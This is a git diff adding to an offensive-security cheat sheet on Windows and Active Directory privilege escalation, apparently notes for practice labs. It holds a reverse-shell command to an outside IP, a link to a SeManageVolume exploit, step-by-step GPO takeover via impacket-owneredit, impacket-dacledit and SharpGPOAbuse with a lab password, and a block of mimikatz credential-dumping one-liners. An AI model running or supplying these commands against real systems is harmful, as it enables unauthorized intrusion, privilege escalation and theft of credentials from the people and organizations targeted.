@@ -45,7 +45,7 @@ hashcat:
 
 ## SeImpersonatePrivilege
 
-### sigmapotato
+### potato
 
 ```powershell
 .\SigmaPotato.exe --revshell 192.168.45.188 4444
@@ -101,6 +101,10 @@ ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 rdesktop 192.168.134.165
 ```
 
+## SeManageVolumePrivilege
+
+Execute the (tool)[https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------]
+
 # GPO
 
 ## ReadGMSAPassword
@@ -137,4 +141,51 @@ impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d
 
 ## WriteOwner
 
-valut machine
+![bloodhound](/images/vault/vault-bloodhound.png)
+
+- make the user (anirudh) owner of the policy.
+
+```sh
+impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM'
+```
+
+- give all privileges to the user
+
+```sh
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172
+```
+
+- Add the user to local admin using SharpGPOAbuse.exe
+
+```powershell
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+```
+
+- Update the policy
+
+```powershell
+gpupdate /force
+```
+
+# mimikatz
+
+```cmd
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+lsadump::sam
+lsadump::lsa
+lsadump::cache
+lsadump::secrets
+```
+
+- one liner
+
+```cmd
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::wdigest" "exit"
+```
+
